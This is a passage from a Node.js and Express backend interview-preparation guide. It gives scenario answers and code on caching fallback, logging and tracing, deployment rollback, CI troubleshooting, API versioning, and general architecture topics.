      this.isAvailable = true;
    });
  }
  
  async get(key) {
    if (!this.isAvailable) return null; // Skip cache entirely
    
    try {
      const data = await this.redis.get(key);
      return data ? JSON.parse(data) : null;
    } catch (error) {
      console.warn('Cache get failed:', error.message);
      return null; // Graceful fallback
    }
  }
  
  async set(key, value, ttl = 300) {
    if (!this.isAvailable) return; // Skip silently
    
    try {
      await this.redis.setEx(key, ttl, JSON.stringify(value));
    } catch (error) {
      console.warn('Cache set failed:', error.message);
      // Don't throw - cache is optional
    }
  }
  
  async del(key) {
    if (!this.isAvailable) return;
    try {
      await this.redis.del(key);
    } catch (error) {
      console.warn('Cache del failed:', error.message);
    }
  }
}

const cache = new CacheService();

// Usage - works whether Redis is up or down
app.get('/api/products/:id', async (req, res) => {
  const cacheKey = `product:${req.params.id}`;
  
  // Try cache (returns null if Redis is down)
  const cached = await cache.get(cacheKey);
  if (cached) return res.json(cached);
  
  // Always have database as fallback
  const product = await Product.findById(req.params.id).lean();
  if (!product) return res.status(404).json({ message: 'Not found' });
  
  // Try to cache (silently fails if Redis is down)
  await cache.set(cacheKey, product, 600);
  
  res.json(product);
});

// Health check includes Redis status
app.get('/health', async (req, res) => {
  res.json({
    status: 'OK',
    cache: cache.isAvailable ? 'connected' : 'degraded',
    database: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected'
  });
});
```

---

<a id="scenario-12-logging-monitoring"></a>
## Scenario 12: Logging & Monitoring

<a id="q53-production-issue-is-reported-but-no-one-can-reproduce-it-locally-how-will-you-investigate"></a>
### Q53. Production issue is reported but no one can reproduce it locally. How will you investigate?

**Answer:**

```javascript
// 1. Check production logs (structured logging is key!)
// Use Winston/Pino with structured JSON logs

const winston = require('winston');
const logger = winston.createLogger({
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' })
  ]
});

// Log with context
app.use((req, res, next) => {
  req.requestId = require('crypto').randomUUID();
  
  res.on('finish', () => {
    logger.info('Request completed', {
      requestId: req.requestId,
      method: req.method,
      url: req.originalUrl,
      statusCode: res.statusCode,
      duration: Date.now() - req.startTime,
      userId: req.user?.id,
      userAgent: req.headers['user-agent'],
      ip: req.ip
    });
  });
  
  req.startTime = Date.now();
  next();
});

// 2. Check error tracking (Sentry/Bugsnag)
const Sentry = require('@sentry/node');
Sentry.init({ dsn: process.env.SENTRY_DSN, environment: 'production' });
// Sentry captures: stack trace, browser info, user context, breadcrumbs

// 3. Compare environments
// Check: Node version, npm packages, OS, env vars, data differences
// Production might have data your local DB doesn't have

// 4. Enable detailed logging temporarily
// Add debug logs around the suspected area
if (process.env.DEBUG_MODE === 'true') {
  logger.debug('Detailed state', { variableA, variableB, requestBody: req.body });
}

// 5. Check metrics
// - Response times (P95, P99)
// - Error rates
// - Memory/CPU usage
// - Database connection pool status

// 6. Try to reproduce with production data (sanitized)
// Export problematic user's data to local, test with same inputs

// 7. Feature flags to toggle behavior
// if (featureFlag.isEnabled('new-calculation')) { ... }
```

---

<a id="q54-users-report-intermittent-failures-which-logs-and-metrics-will-you-check"></a>
### Q54. Users report intermittent failures. Which logs and metrics will you check?

**Answer:**

```javascript
// Intermittent = happens sometimes, not always. Hardest to debug!

// 1. Correlation: WHEN do failures happen?
// Check time-based patterns:
// - Every hour? (Cron job conflict)
// - During peak hours? (Resource exhaustion)
// - After deployment? (New bug)

// 2. Metrics to check:
const metrics = {
  // Application metrics
  requestRate: 'requests per second',
  errorRate: 'errors / total requests (should be < 1%)',
  p95Latency: '95th percentile response time',
  activeConnections: 'concurrent connections',
  
  // Infrastructure metrics
  cpuUsage: 'should be < 70%',
  memoryUsage: 'should be < 80%',
  diskIO: 'read/write operations per second',
  networkIO: 'bandwidth usage',
  
  // Database metrics
  connectionPoolUsage: 'available vs used connections',
  queryTime: 'average query execution time',
  lockWaitTime: 'time spent waiting for locks',
  
  // External dependencies
  thirdPartyResponseTime: 'external API latency',
  thirdPartyErrorRate: 'external API failures'
};

// 3. Logs to check:
// - Error logs with stack traces
// - Timeout logs
// - Connection refused logs
// - "Resource exhausted" messages

// 4. Common causes of intermittent failures:
// - Connection pool exhausted (all DB connections in use)
// - Memory spikes causing GC pauses
// - DNS resolution timeouts
// - Race conditions under load
// - Third-party API rate limiting
// - SSL certificate renewal
// - Database failover

// 5. Add health check with dependency status
app.get('/health/detailed', async (req, res) => {
  const checks = {
    mongodb: await checkMongo(),
    redis: await checkRedis(),
    externalAPI: await checkExternalAPI(),
    memory: process.memoryUsage(),
    uptime: process.uptime(),
    dbPoolSize: mongoose.connection.client.topology?.s?.pool?.totalConnectionCount
  };
  
  const allHealthy = Object.values(checks).every(c => c.status !== 'unhealthy');
  res.status(allHealthy ? 200 : 503).json(checks);
});
```

---

<a id="q55-how-would-you-correlate-logs-across-multiple-services"></a>
### Q55. How would you correlate logs across multiple services?

**Answer:**

```javascript
// Use a Correlation ID (Trace ID) that flows through all services

// 1. Generate at entry point (API Gateway or first service)
// middleware/correlation.js
const correlationMiddleware = (req, res, next) => {
  // Use existing trace ID or generate new one
  req.correlationId = req.headers['x-correlation-id'] || 
                      req.headers['x-request-id'] || 
                      crypto.randomUUID();
  
  // Set in response headers for debugging
  res.setHeader('x-correlation-id', req.correlationId);
  next();
};

// 2. Include in all log entries
const createLogger = (serviceName) => {
  return {
    info: (message, data = {}, req = null) => {
      console.log(JSON.stringify({
        level: 'info',
        service: serviceName,
        correlationId: req?.correlationId || 'no-context',
        timestamp: new Date().toISOString(),
        message,
        ...data
      }));
    },
    error: (message, error, req = null) => {
      console.error(JSON.stringify({
        level: 'error',
        service: serviceName,
        correlationId: req?.correlationId || 'no-context',
        timestamp: new Date().toISOString(),
        message,
        error: { message: error.message, stack: error.stack }
      }));
    }
  };
};

const logger = createLogger('order-service');

// 3. Pass to downstream services
async function callPaymentService(orderData, correlationId) {
  return axios.post('http://payment-service/api/charge', orderData, {
    headers: { 'x-correlation-id': correlationId }
  });
}

// 4. Centralized log aggregation (ELK Stack or CloudWatch)
// All services push logs to same place
// Search by correlationId to see entire request flow:

// [2024-03-15T10:00:00] api-gateway  | correlationId=abc123 | Received POST /api/orders
// [2024-03-15T10:00:01] order-service | correlationId=abc123 | Creating order for user_456
// [2024-03-15T10:00:02] order-service | correlationId=abc123 | Calling payment service
// [2024-03-15T10:00:03] payment-svc  | correlationId=abc123 | Processing payment $99.99
// [2024-03-15T10:00:04] payment-svc  | correlationId=abc123 | Payment successful
// [2024-03-15T10:00:04] order-service | correlationId=abc123 | Order created successfully
// [2024-03-15T10:00:05] notif-svc    | correlationId=abc123 | Sending confirmation email

// 5. Tools: ELK (Elasticsearch + Logstash + Kibana), AWS CloudWatch Insights, Datadog, Splunk
```

---

<a id="scenario-13-deployment-cicd"></a>
## Scenario 13: Deployment & CI/CD

<a id="q56-deployment-failed-in-production-what-is-your-rollback-strategy"></a>
### Q56. Deployment failed in production. What is your rollback strategy?

**Answer:**

```yaml
# Strategy 1: Blue-Green Deployment
# Two identical environments (blue = current, green = new)
# Switch traffic instantly if something goes wrong

# AWS ALB Target Groups:
# Blue (current): target-group-blue → EC2 instances running v1.0
# Green (new):    target-group-green → EC2 instances running v1.1

# Rollback: Switch ALB back to blue target group (< 1 minute)
```

```bash
# Strategy 2: Container-based rollback (Docker/ECS)
# Keep previous image tags
docker tag myapp:latest myapp:v1.0-backup
docker push myapp:v1.1  # New version

# Rollback:
docker pull myapp:v1.0-backup
docker-compose up -d

# ECS: Update task definition to previous revision
aws ecs update-service --cluster prod --service myapp --task-definition myapp:42
# (where 42 is the previous working revision)
```

```javascript
// Strategy 3: Git-based rollback
// Revert the commit and redeploy
// git revert HEAD
// git push origin main
// CI/CD auto-deploys the reverted code

// Strategy 4: Feature flags (safest)
// Deploy code but keep feature disabled
// If issues: turn off flag, no redeployment needed
const LaunchDarkly = require('launchdarkly-node-server-sdk');

app.get('/api/products', async (req, res) => {
  const useNewAlgorithm = await ldClient.variation('new-search-algo', user, false);
  
  if (useNewAlgorithm) {
    return res.json(await newSearch(req.query));
  }
  return res.json(await oldSearch(req.query)); // Safe fallback
});
```

```yaml
# Strategy 5: Kubernetes rollback
# kubectl rollout undo deployment/myapp
# kubectl rollout status deployment/myapp

# Deployment with rollback built-in:
apiVersion: apps/v1
kind: Deployment
spec:
  replicas: 3
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1
      maxUnavailable: 0  # Zero downtime
  revisionHistoryLimit: 10  # Keep 10 previous versions
```

---

<a id="q57-tests-pass-locally-but-fail-in-the-ci-pipeline-what-could-be-the-reasons"></a>
### Q57. Tests pass locally but fail in the CI pipeline. What could be the reasons?

**Answer:**

```
Common causes:

1. Environment differences:
   - Node.js version mismatch (local: v18, CI: v16)
   - OS differences (local: Windows/Mac, CI: Linux)
   - Different npm/yarn versions
   
   Fix: Use .nvmrc or engines field in package.json
   { "engines": { "node": ">=18.0.0" } }

2. Missing environment variables:
   - .env file exists locally but not in CI
   - Fix: Configure CI secrets/variables

3. Database/Service dependencies:
   - Local has MongoDB running, CI doesn't
   - Fix: Use Docker in CI or mock external services
   
4. Timezone issues:
   - Local: IST (UTC+5:30), CI: UTC
   - Tests with date comparisons fail
   
5. File system differences:
   - Case sensitivity: 'User.js' vs 'user.js' (Mac is case-insensitive, Linux isn't)
   - Path separators: \ vs /
   
6. Race conditions:
   - Tests pass with fast local SSD but fail with slower CI disk
   - Async tests without proper await
   
7. Stale dependencies:
   - Local node_modules has old cached versions
   - CI does fresh install

8. Order-dependent tests:
   - Tests pass when run together locally but fail in isolation
   - Fix: Each test should be independent

9. Network access:
   - CI might not have access to external APIs
   - Fix: Mock external calls in tests
```

```yaml
# Fix: Ensure CI mirrors local setup
# .github/workflows/test.yml
name: Test
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    services:
      mongodb:
        image: mongo:6
        ports: ['27017:27017']
      redis:
        image: redis:7
        ports: ['6379:6379']
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
        with:
          node-version: '18'
          cache: 'npm'
      - run: npm ci
      - run: npm test
        env:
          MONGO_URI: mongodb://localhost:27017/test
          REDIS_URL: redis://localhost:6379
          NODE_ENV: test
```

---

<a id="q58-how-do-you-ensure-zero-or-minimal-downtime-during-deployment"></a>
### Q58. How do you ensure zero or minimal downtime during deployment?

**Answer:**

```javascript
// 1. Rolling Deployment (ECS/Kubernetes)
// Replace instances one at a time
// At least N instances always running

// ECS Service configuration:
// minimumHealthyPercent: 50 (at least half running)
// maximumPercent: 200 (can have double during deployment)

// 2. Graceful Shutdown (important!)
const server = app.listen(5000);

process.on('SIGTERM', () => {
  console.log('SIGTERM received. Shutting down gracefully...');
  
  server.close(() => {
    // Close DB connections
    mongoose.connection.close(false, () => {
      console.log('All connections closed. Exiting.');
      process.exit(0);
    });
  });
  
  // Force exit if graceful shutdown takes too long
  setTimeout(() => {
    console.error('Forced shutdown after timeout');
    process.exit(1);
  }, 30000);
});

// 3. Health Checks (ALB waits for healthy before sending traffic)
app.get('/health', (req, res) => {
  if (isShuttingDown) return res.status(503).json({ status: 'shutting-down' });
  res.json({ status: 'healthy' });
});

// 4. Database Migrations (non-breaking)
// BAD: Rename column in same deployment (breaks old code)
// GOOD: 
// Deploy 1: Add new column
// Deploy 2: Migrate data, use new column
// Deploy 3: Remove old column

// 5. Blue-Green with ALB
// Both versions run simultaneously
// Switch traffic at load balancer level

// 6. Canary Deployment
// Route 5% traffic to new version
// Monitor errors for 10 minutes
// If OK, increase to 25%, 50%, 100%
// If errors, route all traffic back to old version
```

---

<a id="scenario-14-api-design"></a>
## Scenario 14: API Design

<a id="q59-you-need-to-introduce-a-breaking-api-change-how-will-you-avoid-affecting-existing-clients"></a>
### Q59. You need to introduce a breaking API change. How will you avoid affecting existing clients?

**Answer:**

```javascript
// API Versioning - Never break existing clients!

// Strategy 1: URL versioning (most common)
app.use('/api/v1/products', v1ProductRoutes);
app.use('/api/v2/products', v2ProductRoutes);

// v1 returns: { id, name, price }
// v2 returns: { id, name, price, variants: [...], metadata: {...} }

// Strategy 2: Header-based versioning
app.use('/api/products', (req, res, next) => {
  const version = req.headers['api-version'] || '1';
  req.apiVersion = parseInt(version);
  next();
});

app.get('/api/products', (req, res) => {
  if (req.apiVersion >= 2) {
    return res.json(newFormat(products));
  }
  return res.json(legacyFormat(products)); // Old format still works
});

// Strategy 3: Deprecation workflow
// 1. Announce deprecation (response header)
app.use('/api/v1', (req, res, next) => {
  res.setHeader('Deprecation', 'true');
  res.setHeader('Sunset', 'Sat, 01 Jun 2025 00:00:00 GMT');
  res.setHeader('Link', '</api/v2>; rel="successor-version"');
  next();
});

// 2. Add new fields (non-breaking - safe to add anytime)
// Old: { name: "iPhone", price: 999 }
// New: { name: "iPhone", price: 999, currency: "USD", category: "phones" }
// Adding fields is NOT a breaking change!

// 3. Breaking changes (require new version):
// - Removing a field
// - Renaming a field
// - Changing field type (string → object)
// - Changing response structure
// - Changing authentication mechanism

// Migration period:
// - Keep v1 running for 6-12 months
// - Log v1 usage to track remaining clients
// - Send deprecation notices to API consumers
// - Eventually sunset v1
```

---

<a id="q60-two-different-teams-consume-your-api-how-will-you-maintain-backward-compatibility"></a>
### Q60. Two different teams consume your API. How will you maintain backward compatibility?

**Answer:**

```javascript
// 1. Additive-only changes (safe for all clients)
// You can ALWAYS safely:
// - Add new endpoints
// - Add new optional fields to responses
// - Add new optional query parameters
// - Add new optional request body fields

// 2. Response envelope pattern (flexible structure)
app.get('/api/products', async (req, res) => {
  const products = await Product.find().lean();
  
  res.json({
    success: true,
    data: products,
    meta: {
      total: products.length,
      page: 1,
      apiVersion: '2.1'
    }
  });
});

// 3. API Documentation (OpenAPI/Swagger)
// Share spec with consuming teams
// They can generate clients from spec
/**
 * @openapi
 * /api/products:
 *   get:
 *     summary: Get all products
 *     parameters:
 *       - in: query
 *         name: category
 *         schema:
 *           type: string
 *         required: false
 *     responses:
 *       200:
 *         description: List of products
 */

// 4. Contract Testing (Pact)
// Each consumer defines what they expect
// Provider verifies it doesn't break any consumer's expectations
// If Team A needs { id, name } and Team B needs { id, name, price }
// Provider must always return all three fields

// 5. Feature flags per consumer
app.get('/api/products', async (req, res) => {
  const clientId = req.headers['x-client-id'];
  const features = await getClientFeatures(clientId);
  
  let response = await getProducts();
  
  if (features.includes('extended-metadata')) {
    response = enrichWithMetadata(response);
  }
  
  res.json(response);
});

// 6. Changelog and communication
// Maintain CHANGELOG.md for API
// Notify teams before ANY change
// Give migration window (minimum 30 days for breaking changes)
```

---

<a id="scenario-15-project-based-questions"></a>
## Scenario 15: Project-Based Questions

<a id="q61-explain-one-api-you-built-from-end-to-end"></a>
### Q61. Explain one API you built from end to end.

**Answer (Example: E-commerce Order API):**

```
Architecture:
Client (React) → Express API → MongoDB → Redis (cache) → S3 (images)

Flow: POST /api/orders

1. Request comes in with: { productId, quantity, shippingAddress }
2. Auth middleware validates JWT token, extracts userId
3. Validation middleware checks required fields
4. Controller:
   a. Checks product exists and has sufficient stock
   b. Calculates total price (product.price × quantity + tax + shipping)
   c. Creates order document in MongoDB (status: 'pending')
   d. Decrements product stock atomically ($inc: { stock: -quantity })
   e. Publishes 'order.created' event to message queue
5. Background workers:
   a. Payment worker: Initiates payment capture
   b. Notification worker: Sends order confirmation email
   c. Inventory worker: Updates warehouse system
6. Response: 201 with order details and estimated delivery
```

```javascript
// Simplified code:
const createOrder = asyncHandler(async (req, res) => {
  const { productId, quantity, shippingAddress } = req.body;
  const userId = req.user.id;
  
  // 1. Validate product and stock
  const product = await Product.findById(productId);
  if (!product) throw new NotFoundError('Product');
  if (product.stock < quantity) throw new ValidationError('Insufficient stock');
  
  // 2. Calculate total
  const subtotal = product.price * quantity;
  const tax = subtotal * 0.18; // 18% GST
  const shipping = subtotal > 500 ? 0 : 50;
  const total = subtotal + tax + shipping;
  
  // 3. Create order with transaction
  const session = await mongoose.startSession();
  session.startTransaction();
  
  try {
    const order = await Order.create([{
      userId, productId, quantity,
      subtotal, tax, shipping, total,
      shippingAddress,
      status: 'pending'
    }], { session });
    
    await Product.updateOne(
      { _id: productId, stock: { $gte: quantity } },
      { $inc: { stock: -quantity } }
    ).session(session);
    
    await session.commitTransaction();
    
    // 4. Async events (non-blocking)
    orderQueue.add('processPayment', { orderId: order[0]._id, total });
    notificationQueue.add('orderConfirmation', { userId, orderId: order[0]._id });
    
    res.status(201).json({ success: true, data: order[0] });
  } catch (error) {
    await session.abortTransaction();
    throw error;
  } finally {
    session.endSession();
  }
});
```

---

<a id="q62-which-part-of-your-project-are-you-most-proud-of-and-why"></a>
### Q62. Which part of your project are you most proud of and why?

**Answer Framework:**

```
Pick something that shows:
1. Technical depth
2. Problem-solving ability
3. Impact on business/users

Example Answer:
"I'm most proud of the caching layer I implemented for our product catalog API.

PROBLEM: 
- API was getting 30,000+ requests/minute
- Average response time was 2.5 seconds
- Database CPU was at 90%

SOLUTION:
- Implemented 3-layer caching (in-memory → Redis → DB)
- Used cache-aside pattern with intelligent invalidation
- Added cache warming for top 500 products on server start
- Implemented stale-while-revalidate for non-critical data

RESULT:
- Response time dropped from 2.5s to 15ms (99.4% improvement)
- Database load reduced by 85%
- Saved ~$400/month in infrastructure costs
- Zero downtime during Redis failures (graceful degradation)

WHY I'M PROUD:
- Solved a real production problem
- Required understanding of trade-offs (consistency vs speed)
- Measurable business impact
- System remained reliable even when cache was down"
```

---

<a id="q63-tell-us-about-the-most-challenging-production-bug-you-fixed"></a>
### Q63. Tell us about the most challenging production bug you fixed.

**Answer Framework:**

```
Structure: Situation → Investigation → Root Cause → Fix → Prevention

Example:
"Users reported intermittent 'Order not found' errors after placing orders.

INVESTIGATION:
1. Checked logs - orders were being created successfully
2. The GET request for order details sometimes returned 404
3. Noticed it only happened under high load

ROOT CAUSE:
We had 3 application instances behind a load balancer. We were using MongoDB
replica set, and after creating an order on the PRIMARY, the GET request 
sometimes went to read from a SECONDARY that hadn't replicated yet 
(read-after-write inconsistency).

FIX:
1. Immediate: Added 'readPreference: primaryPreferred' for order queries
   right after creation
2. Long-term: Implemented read-your-writes pattern using a session token
   that routes the user to primary for 5 seconds after any write

PREVENTION:
- Added integration tests that simulate replica lag
- Documented our read consistency policy
- Set up alerts for replication lag > 2 seconds"
```

---

<a id="q64-how-did-you-optimize-one-slow-api-in-your-project"></a>
### Q64. How did you optimize one slow API in your project?

**Answer Example:**

```javascript
// Before optimization:
// GET /api/dashboard - Response time: 8.5 seconds

app.get('/api/dashboard', async (req, res) => {
  // Problem 1: Sequential queries (could be parallel)
  const user = await User.findById(req.user.id);
  const orders = await Order.find({ userId: req.user.id });
  const products = await Product.find({ sellerId: req.user.id });
  const reviews = await Review.find({ userId: req.user.id });
  
  // Problem 2: N+1 query - loop with DB calls
  for (const order of orders) {
    order.productDetails = await Product.findById(order.productId); // 50 queries!
  }
  
  // Problem 3: No projection - fetching all fields
  // Problem 4: No caching - same data fetched every time
  
  res.json({ user, orders, products, reviews });
});

// After optimization:
// GET /api/dashboard - Response time: 180ms (97% improvement!)

app.get('/api/dashboard', async (req, res) => {
  const cacheKey = `dashboard:${req.user.id}`;
  const cached = await redis.get(cacheKey);
  if (cached) return res.json(JSON.parse(cached));
  
  // Fix 1: Parallel queries
  const [user, orders, products, reviews] = await Promise.all([
    User.findById(req.user.id).select('name email avatar').lean(),
    Order.find({ userId: req.user.id })
      .sort({ createdAt: -1 })
      .limit(10)
      .populate('productId', 'name price image') // Fix 2: populate instead of N+1
      .lean(),
    Product.find({ sellerId: req.user.id }).select('name price stock').lean(),
    Review.find({ userId: req.user.id }).limit(5).lean()
  ]);
  
  const response = { user, orders, products, reviews };
  
  // Fix 3: Cache for 2 minutes
  await redis.setEx(cacheKey, 120, JSON.stringify(response));
  
  res.json(response);
});

// Also added:
// - Compound index: { userId: 1, createdAt: -1 }
// - Connection pooling: maxPoolSize: 50
```

---

<a id="q65-describe-your-applications-architecture"></a>
### Q65. Describe your application's architecture.

**Answer Template:**

```
My Application: E-commerce Platform (MERN Stack)

┌─────────────┐     ┌──────────────┐     ┌─────────────┐
│   React.js  │────▶│   Express.js │────▶│   MongoDB   │
│  (Frontend) │     │   (Backend)  │     │  (Database) │
└─────────────┘     └──────────────┘     └─────────────┘
       │                    │                     
       │                    ├────▶ Redis (Cache + Sessions)
       │                    ├────▶ AWS S3 (File Storage)
       │                    ├────▶ Bull Queue (Background Jobs)
       │                    └────▶ Nodemailer (Emails)
       │
       └────▶ CloudFront CDN (Static Assets)

Frontend:
- React.js with Zustand (state management)
- React Router for navigation
- Axios with interceptors for API calls
- Deployed on Vercel/Netlify

Backend:
- Express.js REST API
- JWT authentication (access + refresh tokens)
- Role-based authorization (user, admin, seller)
- Input validation with Joi
- Error handling middleware (centralized)
- Rate limiting and security (Helmet, CORS)

Database:
- MongoDB Atlas (managed cluster)
- Mongoose ODM
- Indexes on frequently queried fields
- Transactions for order processing

Infrastructure:
- Docker containers
- AWS EC2 (or ECS for container orchestration)
- Nginx reverse proxy
- PM2 process manager
- GitHub Actions for CI/CD
- CloudWatch for monitoring
```

---

<a id="q66-q70-quick-answers"></a>
### Q66-Q70 Quick Answers:

**Q66. How did you implement authentication?**
- JWT-based with access token (15min) + refresh token (7 days)
- Bcrypt for password hashing (salt rounds: 12)
- HTTP-only cookies for refresh tokens
- Role-based middleware for authorization
- Token blacklist in Redis for logout

**Q67. How did you deploy your application?**
- Dockerized both frontend and backend
- GitHub Actions: lint → test → build → push to ECR → deploy to ECS
- Blue-green deployment with ALB health checks
- Environment variables via AWS Secrets Manager

**Q68. How did you monitor production issues?**
- Structured JSON logs with Winston
- CloudWatch Logs + Alarms (CPU > 80%, Error rate > 5%)
- Sentry for error tracking (stack traces, user context)
- Health check endpoints polled every 30 seconds
- PagerDuty alerts for critical issues

**Q69. How did you handle exceptions and logging?**
- Global error handling middleware (catches all async errors)
- Custom AppError class with statusCode
- Different error responses for dev vs production
- Request ID in every log entry for tracing
- Log levels: error, warn, info, debug

**Q70. If you had to redesign your backend today, what would you improve?**
- Add TypeScript for type safety
- Event-driven architecture (EventEmitter/Message Queue) instead of direct calls
- GraphQL for complex data fetching (eliminate over/under-fetching)
- Better test coverage (unit + integration + e2e)
- API versioning from day one
- Rate limiting per user, not just per IP
- OpenTelemetry for distributed tracing
- Database read replicas for heavy read operations

---

<a id="bonus-additional-high-frequency-interview-questions"></a>
## Bonus: Additional High-Frequency Interview Questions

<a id="q71-what-is-the-event-loop-in-nodejs-explain-with-example"></a>
### Q71. What is the Event Loop in Node.js? Explain with example.

**Answer:**

```javascript
// Node.js is single-threaded but handles concurrency via the Event Loop

// Event Loop Phases:
// 1. Timers (setTimeout, setInterval)
// 2. Pending Callbacks (I/O callbacks)
// 3. Idle/Prepare (internal)
// 4. Poll (I/O events - file read, network)
// 5. Check (setImmediate)
// 6. Close (socket.on('close'))

console.log('1. Start');                           // Sync - runs first

setTimeout(() => console.log('2. Timeout'), 0);    // Timer phase

setImmediate(() => console.log('3. Immediate'));    // Check phase

Promise.resolve().then(() => console.log('4. Promise')); // Microtask (before next phase)

process.nextTick(() => console.log('5. NextTick')); // Microtask (highest priority)

console.log('6. End');                             // Sync - runs second

// Output:
// 1. Start
// 6. End
// 5. NextTick (microtask - highest priority)
// 4. Promise (microtask)
// 2. Timeout (or 3. Immediate - order varies)
// 3. Immediate (or 2. Timeout)

// Why it matters for interviews:
// - Explains how Node handles 10,000+ connections on single thread
// - Blocking the event loop (CPU-heavy code) blocks ALL users
// - I/O operations are non-blocking (delegated to OS/libuv thread pool)
```

---

<a id="q72-difference-between-sql-and-nosql-when-to-use-which"></a>
### Q72. Difference between SQL and NoSQL. When to use which?

**Answer:**

| Feature | SQL (PostgreSQL/MySQL) | NoSQL (MongoDB) |
|---------|----------------------|-----------------|
| Schema | Fixed, structured | Flexible, dynamic |
| Relationships | JOINs, foreign keys | Embedded docs, references |
| Scaling | Vertical (bigger server) | Horizontal (more servers) |
| Transactions | Strong ACID | Limited (multi-doc since v4) |
| Query Language | SQL | JSON-based queries |
| Best for | Complex relationships | Rapid development, varied data |

```
USE SQL WHEN:
- Complex relationships (e-commerce with orders, products, users, reviews)
- Need ACID transactions (banking, payments)
- Data structure won't change much
- Need complex JOINs and aggregations

USE NoSQL WHEN:
- Flexible/evolving schema (startup MVP)
- High read/write throughput
- Hierarchical data (comments, catalogs)
- Horizontal scaling needed
- Real-time apps (chat, IoT, gaming)

REAL EXAMPLE:
An e-commerce app might use BOTH:
- PostgreSQL: Users, Orders, Payments (relational, transactional)
- MongoDB: Product catalogs (varied attributes per category)
- Redis: Sessions, caching, real-time inventory counts
```

---

<a id="q73-what-are-design-patterns-youve-used-in-nodejs"></a>
### Q73. What are Design Patterns you've used in Node.js?

**Answer:**

```javascript
// 1. Singleton Pattern (Database connection)
class Database {
  static instance = null;
  
  static getInstance() {
    if (!Database.instance) {
      Database.instance = mongoose.connect(MONGO_URI);
    }
    return Database.instance;
  }
}

// 2. Factory Pattern (Creating different notification types)
class NotificationFactory {
  static create(type, data) {
    switch (type) {
      case 'email': return new EmailNotification(data);
      case 'sms': return new SMSNotification(data);
      case 'push': return new PushNotification(data);
      default: throw new Error(`Unknown notification type: ${type}`);
    }
  }
}

// 3. Observer Pattern (EventEmitter)
const EventEmitter = require('events');
const orderEvents = new EventEmitter();

// Register observers
orderEvents.on('orderCreated', (order) => sendConfirmationEmail(order));
orderEvents.on('orderCreated', (order) => updateInventory(order));
orderEvents.on('orderCreated', (order) => notifyWarehouse(order));

// Emit event
async function createOrder(data) {
  const order = await Order.create(data);
  orderEvents.emit('orderCreated', order); // All observers notified
  return order;
}

// 4. Middleware Pattern (Express)
// Chain of responsibility - each middleware decides to pass or reject
app.use(logger);
app.use(authenticate);
app.use(authorize);
app.use(validate);
// Each calls next() to pass to next in chain

// 5. Repository Pattern (Data access abstraction)
class ProductRepository {
  async findById(id) { return Product.findById(id).lean(); }
  async findByCategory(cat) { return Product.find({ category: cat }).lean(); }
  async create(data) { return Product.create(data); }
  async update(id, data) { return Product.findByIdAndUpdate(id, data, { new: true }); }
  async delete(id) { return Product.findByIdAndDelete(id); }
}
```

---

<a id="q74-how-does-garbage-collection-work-in-nodejs"></a>
### Q74. How does Garbage Collection work in Node.js?

**Answer:**

```javascript
// V8 Engine uses Generational Garbage Collection:

// 1. Young Generation (Scavenger)
// - New objects allocated here (small space ~1-8MB)
// - Collected frequently (fast)
// - Objects that survive 2 GC cycles move to Old Generation

// 2. Old Generation (Mark-Sweep-Compact)
// - Long-lived objects
// - Collected less frequently (slower, causes pauses)
// - Triggered when heap grows significantly

// Monitor GC:
// node --trace-gc server.js

// Manual GC (only for debugging):
// node --expose-gc server.js
// global.gc();

// Impact on performance:
// - GC pauses can cause latency spikes (10-100ms)
// - Large heaps = longer GC pauses
// - Reduce allocations = fewer GC cycles

// Best practices:
// 1. Reuse objects instead of creating new ones
// BAD: 
app.get('/api/data', (req, res) => {
  const config = { timeout: 5000, retries: 3 }; // New object every request!
  // ...
});

// GOOD:
const config = { timeout: 5000, retries: 3 }; // Created once
app.get('/api/data', (req, res) => {
  // Use existing config
});

// 2. Use streams for large data (don't load all into memory)
// 3. Set references to null when done with large objects
// 4. Use WeakMap/WeakSet for caches that should be GC'd
```

---

<a id="q75-explain-rest-api-best-practices"></a>
### Q75. Explain REST API best practices.

**Answer:**

```javascript
// 1. Use proper HTTP methods
GET    /api/products        // List all
GET    /api/products/:id    // Get one
POST   /api/products        // Create
PUT    /api/products/:id    // Full update
PATCH  /api/products/:id    // Partial update
DELETE /api/products/:id    // Delete

// 2. Use proper status codes
200 - OK (GET, PUT success)
201 - Created (POST success)
204 - No Content (DELETE success)
400 - Bad Request (validation error)
401 - Unauthorized (not logged in)
403 - Forbidden (no permission)
404 - Not Found
409 - Conflict (duplicate)
422 - Unprocessable Entity
429 - Too Many Requests
500 - Internal Server Error

// 3. Consistent response format
// Success:
{
  "success": true,
  "data": { /* actual data */ },
  "meta": { "page": 1, "total": 100, "limit": 20 }
}

// Error:
{
  "success": false,
  "message": "Product not found",
  "errorCode": "PRODUCT_NOT_FOUND"
}

// 4. Filtering, Sorting, Pagination
GET /api/products?category=electronics&sort=-price&page=2&limit=20

// 5. Use plural nouns (products, not product)
// 6. Nest resources logically
GET /api/users/:userId/orders       // Orders for a specific user
GET /api/products/:productId/reviews // Reviews for a product

// 7. Versioning
/api/v1/products
/api/v2/products

// 8. HATEOAS (Hypermedia links)
{
  "data": { "id": 1, "name": "iPhone" },
  "links": {
    "self": "/api/products/1",
    "reviews": "/api/products/1/reviews",
    "seller": "/api/users/42"
  }
}
```

---

<a id="q76-what-is-the-difference-between-monolithic-and-microservices-architecture"></a>
### Q76. What is the difference between Monolithic and Microservices architecture?

**Answer:**

```
MONOLITHIC:
┌─────────────────────────────────┐
│         Single Application       │
│  ┌───────┐ ┌───────┐ ┌───────┐ │
│  │ Users │ │Orders │ │Payment│ │
│  └───────┘ └───────┘ └───────┘ │
│        Single Database           │
└─────────────────────────────────┘

Pros: Simple to develop, deploy, debug
Cons: Hard to scale, single point of failure, long deploy cycles

MICROSERVICES:
┌──────────┐  ┌──────────┐  ┌──────────┐
│User Svc  │  │Order Svc │  │Payment Svc│
│  +DB     │  │  +DB     │  │  +DB      │
└──────────┘  └──────────┘  └──────────┘
     │              │              │
     └──────── Message Queue ──────┘

Pros: Independent scaling, tech flexibility, resilience
Cons: Complex, distributed debugging, eventual consistency

WHEN TO USE WHAT:
- Startup/Small team → Monolith (simple, fast development)
- Growing team (10+ devs) → Consider microservices
- High scale needed for specific feature → Extract that service

MY APPROACH:
